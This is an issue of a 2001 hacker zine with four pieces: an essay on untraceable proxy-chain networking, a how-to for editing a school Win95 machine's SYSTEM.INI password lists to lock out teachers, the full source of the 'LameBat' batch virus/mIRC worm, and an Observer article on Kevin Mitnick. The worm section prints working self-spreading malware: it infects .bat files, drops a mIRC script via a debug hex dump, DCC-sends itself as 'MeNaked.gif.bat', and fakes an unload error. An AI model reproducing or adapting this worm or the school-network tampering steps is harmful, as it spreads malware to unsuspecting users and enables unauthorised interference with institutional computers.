BadByte Underground Zine - Issue #5 - November 2001

	    ____            ______        __
	   / __ )____ _____/ / __ )__  __/ /____
	  / __  / __ `/ __  / __  / / / / __/ _ \
	 / /_/ / /_/ / /_/ / /_/ / /_/ / /_/  __/
	/_____/\__,_/\__,_/_____/\__, /\__/\___/
				/____/ ISSUE #5

INDEX:
001 ............. Anonyminity on the internet
002 ............. How to hack your school's Win95 network
003 ............. LameBat virus by EXE-Gency
004 ............. Hacker cries foul over FBI snooping (the Observer)


I'd like to appologise for the massive delay between BadByte 4 and 5
but i have had a lot of things going on in the past few months!

-Th0r

Remember, you can contribute to BadByte!

email: th0r@hackermail.com
fax:   +1 626 609 2530 (USA)




<End Of Article>--<End Of Article>--<End Of Article>--<End Of Article>



*[001]* Anonyminity on the internet

This document was taken from http://JonathanClark.com with permission,
its almost 2 years old but i thought it was rather interesting anyway.
Check out http://www.jonathanclark.com for similar articles. :)

May 6, 1999

What if you were living in a country that didn't allow free speech?
How could you run a web site that didn't support the views of your
government without getting caught and thrown in jail?  This is the
problem I have been wondering about lately.  Specifically, how can you
make a network that can send and receive information that is totally
untraceable?  For the purposes of this discussion I'll call "the
government" as the "the bad guys" or TBG, though it may very well be
that the people using this system are actually the bad guys.
Specifically this method could be using to create untraceable warez
sites, or allow terrorist to communicate in an untraceable fashion.
 
Untracable is not the same thing as encrypted.  When you send someone
encrypted email, TBG can't read it but they can determine where it is
going and where it came from.  For untraceable email there already
exist a system called anonymous remailers which send your mail to a
chain of "remailer" machines which finally deliver it to the
destination machine.  This makes it very difficult to trace the mail
to the computer it came from because the government must be tapping
each of the computer's communication to put it all together.  In most
cases the computers are located in different countries, thwarting the
ability of any one government to do this.  Further the time delay
makes it hard to correlate the time of receipt with output traffic
from your computer.  If you send a nasty letter to your boss, he could
look at your time sheet and see if you were working at the time the
message was sent.

  There are two problems with this scheme in the web world.  #1 It's
not realtime.  Your messages are delayed perhaps by several hours for
reasons discussed above.  In the web site setting you do not have the
same need to delay traffic, just the delay of content updating.  For
example, if someone visits you web site, they need to get data that
second, but you may have a schedule program that updates the content
of your web site when you are not around.  #2 There is no return path.
In order to remain anonymous in the email world, you cannot supply
your email address in the "reply-to".  These days you can setup a
dummy account at hotmail, yahoo, or a whole score of others as well
but a determined government could trace these back to you.

  So how can we be anonymous in a real-time way for all services?
I.e. WWW, Chat, FTP, and email.  The problem is broken into 2 smaller
problems.  Send and Receiving.  Both Sending and Receiving face the
problem of time-correlation.  Without a time delay, it might seem a
site could be compromised.  Consider this: you are running a web site
which publishes anti-Communist material and TBG are trying to
determine if that site belongs to you.  They put a tap on your
connection/phone line, and then connect to your web site.  If you are
using plain old TCP/IP, they could read the data packets from the
phone line and see if it is your web site.  I will deal with this
issue in a second, but lets say for now you are using magical
encryption that prevents them from reading the data.  Still they can
tell the difference between data and no data.  All they have to do is
visit your site several times and correlate that with the traffic on
your phone line.  If the traffic times match, they have their man.  To
solve the time delay issue, your site must always operate at a
constant bandwidth.  If your site does not have any information to
send someone it will send a "null" packet to a random host on the net.
If everyone on the net is always using 100% of their bandwidth sending
null packets everywhere, the internet would quickly become
bottlenecked.  This can be reduced by using ramping functions applied
to bandwidth usage.  By this, I mean a site will moderate its
bandwidth usage slowly at a constant rate over time as needed by its
services.  Also it will ramp up and down at random intervals even when
not needed.  Because your are always receiving/sending a constant
amount of information TBG cannot correlate their events against yours.

   Under TCP/IP a packet of information contains a source and
destination address.  The computers in the internet know a specific
route to get to every internet address and they pass the information
along until it gets to the destination computer.  When the destination
computer wants to send information back it uses the IP address of the
source computer.  It is a fairly simple task to trace the path
information travels to a computer and thus find where the computer is
located.  How can we make it impossible to trace back to the source
computer and still stay compatible with the TCP/IP?  One way is to use
a chain of encrypting proxy servers.  Each proxy server has a public
encryption key.  To make a connection to a remote host you would
gather all of the public keys for proxies you want to use.  Then you
form a connection request that looks like this :

(CONNECT SERVER2) [encrypted with server1 public key
  CONNECT SERVER3) 
  [encrypted with server2 public key
    etc.
    CONNECT destination..]]]


In this manner the destination host is only known by the last host and
the source address is only know by the first server.  This prevents
the receiver of the information from knowing the source address.  One
problem with is that each server must keep state information about the
connection, requiring more memory and processing to be done for each
socket.  If a proxy server is handling connections for millions of
users, it must remember that many routes and decryption keys.  To have
a state-less connection the packet would have to contain all the
routing information in each packet and public key decryption would
have to be done on each packet.  Putting the routing information in
the packet would require a lot more bandwidth, and asymmetric
decryption is an extremely expensive computational task that could not
be done per packet.  Perhaps hardware accelerated decryption will
eventually make this a possibility someday.  But, but by using a
little magic we can use symmetrical encryption operations (such as
DES), which are very cheap to compute.  If anyone is interested in how
to do this, email as this is getting long.

  Ok.  So we can send information confidentially, but what about
receiving?  Somehow someone on the net has to be able to get
information to your computer.  In order for this to happen some
computers out there have to know where you are, right?  Not exactly.
Again, this solution is not the most bandwidth efficient, but what if
no one knows exactly where you are.  The information is encrypted with
your public key so only you will be able to read it, and then the
information is broadcast a wide number of computers, one of them being
you.  TBG have no way to determine which computer is actually using
the information.  This works well on systems already setup on a
broadcast system such as Ethernet, radio, or cable modem users.
However, it may that determining your neighbor is good enough for TBG
because then they can go door to door and seize computers until they
find you.  Depending on the level of security you need you can setup
broadcast to occur at as many subnets as you would like.  This is only
done for the connection phase.  The remote computer has somehow been
able to contact you and tell you it wants to make a connection.  You
then use the opposite method described above to give the remote host a
route to contact you in a more bandwidth efficient manner.  When you
send them a route, the proxy chain will start from a point it has
requested.  Because the only the proxy servers can decrypt the chain
information, the remote host has no way to determine how to get to you
directly.
  
  So how could this be applied to the Internet as we know it now?  If
you type in http://cnn.com in your web browser your computer will
consult a chain of name servers to ask for the IP address associated
with cnn.com (there can be many IPs per host).  In our case, there
will be a machine on the net that host your name and responds to
connections to your IP address by sending out a broadcast probe to get
a message to your real (unnamed) IP address.  This machine knows
nothing about you other than it is hosting that domain name and IP
address, and has a list of subnets to try to contact you on.  Each
subnet that it tries could host another proxy.  Once you receive this
message you initiate a proxy chain back to the server which sends
messages to the client using normal TCP.  The client may be using a
similar set of proxies to hide it's identity but you will not know
this of course.
 
While I don't have any plans to implement this system, I think it
would an interesting exercise.  Is there anything like this available
already?



<End Of Article>--<End Of Article>--<End Of Article>--<End Of Article>




*[002]* How to hack your school's Win95 network

I know that Win95 has been superceded by Win98 and WinME, but some
schools networks still use PCs with '95 (like mine). I discovered this
by accident one day when i opened up SYSTEM.INI in notepad when i was
trying to disable the most lame of screen savers.

Instructions:
1. Load up NOTEPAD or some other text-editing program.
2. Open up the "C:\WINDOWS\SYSTEM.INI" file (assuming that C:\WINDOWS
   is ur win95 dir)
3. Scroll down until you see something like this...

       [Password Lists]
       STATION 12=C:\WINDOWS\STATION.PWL
       LAME ASS=C:\WINDOWS\LAME.PWL

4. Now erase all of these lines including the "[Password Lists]" line.
5. Re-Boot the computer.
6. When the login screen comes up, type in any old password that you want,
   Windows will then ask for confirmation of this 'new' password and you'll
   have to type it in again.

Although there's nothing much that you can do with Win95, it'll bug the
teachers and technicians that they cant login (unless they click on cancel)




<End Of Article>--<End Of Article>--<End Of Article>--<End Of Article>




*[003]* LameBat virus by EXE-Gency

thanks to EXE-Gency for this :)

              שששששששששששששששששששששששששששששששששששששששששששששששש
              ש      L A M E B A T - v i r u s / w o r m     ש
              ש            b y - E X E - G e n c y           ש
              ש flames, bitching, comments and questions to: ש
              ש             exegency@hotmail.com             ש
              שששששששששששששששששששששששששששששששששששששששששששששששש

      Disclaimer! This virus/worm is provided without warranty of any
      kind. It is provided purely for educational and entertainment
      purposes and it is not recommended that you run the batch program
      unless you know what you are doing.


I wrote this piece of shit in a total of 12 minutes. It's a dead simple mIRC
virus/worm written in DOS batch language. It sucks. Nah. It really fucking
sucks.

The virus part of the batch program simply searches for .BAT files in the
current directory and adds a line at the bottom of each that calls the 
virus.
Infected files are given +r (readonly) attributes to prevent re-infection.

The worm part basically checks if the file 'mirc.ini' exists in one of the
following directories: 'c:\mirc', 'c:\mirc32', 'c:\program files\mirc' or
'c:\program files\mirc32'. When one is found, a debug script is echoed to a
temporary file called 'script.scr' which is then piped to the debug program
to produce the 'script.ini' file. Finally this file is copied to the mirc
directory.

<---------------------------------------->

@echo off
goto OverThere
rem LameBat virus/worm by EXE-Gency of KrashMag
rem exegency@hotmail.com
OverThere:
echo orgy > infect1.bat
echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat
echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat
echo copy %%1 + infect1.bat %%1 >> infect2.bat
echo attrib +r %%1 >> infect2.bat
echo :DontBother >> infect2.bat
attrib +r infect1.bat
attrib +r infect2.bat
for %%f in (*.bat) do call infect2 %%f
attrib -r infect1.bat
attrib -r infect2.bat
del infect1.bat
del infect2.bat
copy %0.bat c:\lamebat.bat > nul
if exist c:\mirc\mirc.ini goto mIRC
if exist c:\mirc32\mirc.ini goto mIRC32
if exist c:\progra~1\mirc\mirc.ini goto ProgramFilesmIRC
if exist c:\progra~1\mirc32\mirc.ini goto ProgramFilesmIRC32
goto NomIRC
:mIRC
set InstallDir=c:\mirc
goto InstallScript
:mIRC32
set InstallDir=c:\mirc32\script.ini
goto InstallScript
:ProgramFilesmIRC
set InstallDir=c:\progra~1\mirc\script.ini
goto InstallScript
:ProgramFilesmIRC32
set InstallDir=c:\progra~1\mirc32\script.ini
:InstallScript
echo N script.ini > script.scr
echo E 0100 5B 73 63 72 69 70 74 5D 0D 0A 6E 30 3D 6F 6E 20 >> script.scr
echo E 0110 31 3A 4A 4F 49 4E 3A 23 3A 20 7B 0D 0A 6E 31 3D >> script.scr
echo E 0120 20 20 20 20 69 66 20 28 20 24 6D 65 20 21 3D 20 >> script.scr
echo E 0130 24 6E 69 63 6B 20 29 20 7B 0D 0A 6E 32 3D 20 20 >> script.scr
echo E 0140 20 20 20 20 20 20 2F 63 6F 70 79 20 2D 6F 20 63 >> script.scr
echo E 0150 3A 5C 6C 61 6D 65 62 61 74 2E 62 61 74 20 63 3A >> script.scr
echo E 0160 5C 4D 65 4E 61 6B 65 64 2E 67 69 66 2E 62 61 74 >> script.scr
echo E 0170 0D 0A 6E 33 3D 20 20 20 20 20 20 20 20 2F 64 63 >> script.scr
echo E 0180 63 20 73 65 6E 64 20 24 6E 69 63 6B 20 63 3A 5C >> script.scr
echo E 0190 4D 65 4E 61 6B 65 64 2E 67 69 66 2E 62 61 74 0D >> script.scr
echo E 01A0 0A 6E 34 3D 20 20 20 20 7D 0D 0A 6E 35 3D 7D 0D >> script.scr
echo E 01B0 0A 6E 36 3D 6F 6E 20 31 3A 43 4F 4E 4E 45 43 54 >> script.scr
echo E 01C0 3A 20 7B 0D 0A 6E 37 3D 20 20 20 20 2F 6A 6F 69 >> script.scr
echo E 01D0 6E 20 23 76 69 72 75 73 0D 0A 6E 38 3D 20 20 20 >> script.scr
echo E 01E0 20 2F 6D 73 67 20 23 76 69 72 75 73 20 68 65 68 >> script.scr
echo E 01F0 2E 20 48 6F 77 20 64 75 6D 62 20 61 6D 20 49 3F >> script.scr
echo E 0200 0D 0A 6E 39 3D 20 20 20 20 2F 6D 73 67 20 23 76 >> script.scr
echo E 0210 69 72 75 73 20 49 20 67 6F 74 20 69 6E 66 65 63 >> script.scr
echo E 0220 74 65 64 20 77 69 74 68 20 4C 61 6D 65 42 61 74 >> script.scr
echo E 0230 20 62 79 20 45 58 45 2D 47 65 6E 63 79 0D 0A 6E >> script.scr
echo E 0240 31 30 3D 20 20 20 2F 6C 65 61 76 65 20 23 76 69 >> script.scr
echo E 0250 72 75 73 0D 0A 6E 31 31 3D 7D 0D 0A 6E 31 32 3D >> script.scr
echo E 0260 6F 6E 20 2A 3A 49 4E 50 55 54 3A 2A 3A 20 7B 0D >> script.scr
echo E 0270 0A 6E 31 33 3D 20 20 20 20 69 66 20 28 20 24 31 >> script.scr
echo E 0280 2D 20 3D 3D 20 2F 75 6E 6C 6F 61 64 20 2D 72 73 >> script.scr
echo E 0290 20 73 63 72 69 70 74 2E 69 6E 69 20 29 20 7B 0D >> script.scr
echo E 02A0 0A 6E 31 34 3D 20 20 20 20 20 20 20 20 2F 65 63 >> script.scr
echo E 02B0 68 6F 20 55 6E 61 62 6C 65 20 74 6F 20 75 6E 6C >> script.scr
echo E 02C0 6F 61 64 20 73 63 72 69 70 74 20 3A 28 0D 0A 6E >> script.scr
echo E 02D0 31 35 3D 20 20 20 20 20 20 20 20 2F 68 61 6C 74 >> script.scr
echo E 02E0 0D 0A 6E 31 36 3D 20 20 20 20 7D 0D 0A 6E 31 37 >> script.scr
echo E 02F0 3D 7D 0D 0A 6E 31 38 3D 63 74 63 70 20 31 3A 50 >> script.scr
echo E 0300 49 4E 47 3A 2F 6E 6F 74 69 63 65 20 24 6E 69 63 >> script.scr
echo E 0310 6B 20 73 74 30 30 70 69 64 20 66 75 63 6B 40 24 >> script.scr
echo E 0320 25 23 21 20 7C 20 2F 68 61 6C 74 0D 0A 0D 0A >> script.scr
echo RCX >> script.scr
echo 022F >> script.scr
echo W >> script.scr
echo Q >> script.scr
debug < script.scr > nul
copy script.ini %InstallDir% > nul
del script.ini
del script.scr
:NomIRC

<---------------------------------------->

To save you from having to decipher the debug script above, I'll simply show
you mIRC script that it creates. The script does the following things:

* Whenever anyone /joins a channel that an infectee is on, the virus is 
named
   to 'MeNaked.gif.bat' and /DCCed to them. Upon execution of the Batch 
file,
   the worm will install itself in the mIRC directory (if it exists.)
* Upon connection to an IRC server, the script automatically /joins the
   #virus channel and /msgs a couple of things.
* If the user attempts to /unload the script, a fake error message is
   produced.
* If another user /pings an infectee, they will receive a little message.

Bah. Carnt be arsed to talk about this lame piece of crap anymore. Here is
the script.ini file that is created from the debug script:

<---------------------------------------->

[script]
n0=on 1:JOIN:#: {
n1=    if ( $me != $nick ) {
n2=        /copy -o c:\lamebat.bat c:\MeNaked.gif.bat
n3=        /dcc send $nick c:\MeNaked.gif.bat
n4=    }
n5=}
n6=on 1:CONNECT: {
n7=    /join #virus
n8=    /msg #virus heh. How dumb am I?
n9=    /msg #virus I got infected with LameBat by EXE-Gency
n10=   /leave #virus
n11=}
n12=on *:INPUT:*: {
n13=    if ( $1- == /unload -rs script.ini ) {
n14=        /echo Unable to unload script :(
n15=        /halt
n16=    }
n17=}
n18=ctcp 1:PING:/notice $nick st00pid fuck@$%#! | /halt

<---------------------------------------->





<End Of Article>--<End Of Article>--<End Of Article>--<End Of Article>




*[004]* 'Hacker cries foul over FBI snooping' from the Observer.


Hacker cries foul over FBI snooping 

Burhan Wazir
Sunday October 21, 2001
The Observer

The world's most infamous computer hacker, out of jail and eking a
living as an actor in a television drama, has denounced the new
Patriot Act - which would allow FBI and police to snoop on emails
and monitor US internet activity in their efforts to counter terrorism.
Kevin Mitnick, 38, imprisoned for breaking into the computer
systems of America's leading telephone companies, told The
Observer that the legislation proposed in the wake of the 11
September attacks was 'ludicrous'.

'Terrorists have proved that they are interested in total genocide,
not subtle little hacks of the US infrastructure, yet the government
wants a blank search warrant to spy and snoop on everyone's
communications,' he said. Mitnick also warned that hackers risked
inordinately heavy exemplary jail sentences. 'Trust me, you do not
want to be the next big winner of the scapegoat sweepstakes.'

Mitnick says he was a scapegoat. He was arrested and charged
with committing seven software felonies in 1995 and held without
bail, sometimes in solitary confinement, until his conviction in
1999. Altogether he served four and a half years before being
freed in January last year.

Under the terms of his release, he is banned until January 2003
from using a computer, finding employment as a technical
consultant or even writing about computer technology without
permission from his probation officer. He was only recently given
approval to carry a mobile phone to keep in touch with family
members following the death of his father five months ago. Faced
with the restrictions, Mitnick has found work in an ABC spy drama,
Alias, in which he plays a CIA computer expert.

Mitnick, whose career won him a place in the Guinness Book of
World Records as the world's most notorious hacker, says he was
a victim of circumstance. 'I am not innocent but I certainly didn't do
most of what I was accused of,' he says. 'A hacker doesn't
deliberately destroy data or profit from his activities. I never made
any money directly from hacking. I wasn't malicious. A lot of the
unethical things I did were to cover my own ass when I was a
fugitive.'

He hacked into the email of New York Times reporter John
Markoff, who was covering the FBI's pursuit of him.

Mitnick says: 'I read the emails because they were discussing how
the FBI was going to catch me. I didn't read it all, just searched for
a combination of letters that's in my name, and words like "trap",
"trace" and things like that. Again, this is something I had to do to
cover my ass, total self-preservation.' He and Markoff
subsequently co-wrote a book about the case.

Having testified before a Senate committee on the dangers of
politically motivated hackings, Mitnick continues to believe that the
threat from cyberterrorism could easily be countered by
strengthening security measures at government institutions and
private corporations.

'Yes, a co-ordinated team of hackers could take down the
communications systems, the power system, perhaps the financial
markets,' he says. 'But all of those systems would be back online
pretty quickly - you can't really knock them out for an extended
period. You could use those outrages as a decoy though, to draw
attention from what you are really planning.'

But, he warns, now is not the time to be hacking. He cites the case
of Dmitry Skylarov, a Russian software programmer awaiting trial
in the US on charges that he violated the Digital Millennium
Copyright Act. 'I hope Dmitry puts up a good fight. He's got a great
lawyer, I had a public defender. He's innocent, whereas I wasn't.'





<End Of Article>--<End Of Article>--<End Of Article>--<End Of Article>




Due to the fact that the badsector.org.uk domain will not be mine
from Febuary means that we will be moving from FreeNetName to another
host like freeserve and a few other places like xoom, etc.

Work on BadByte #6 will be halted until then.

-Th0r

<END OF ZINE>
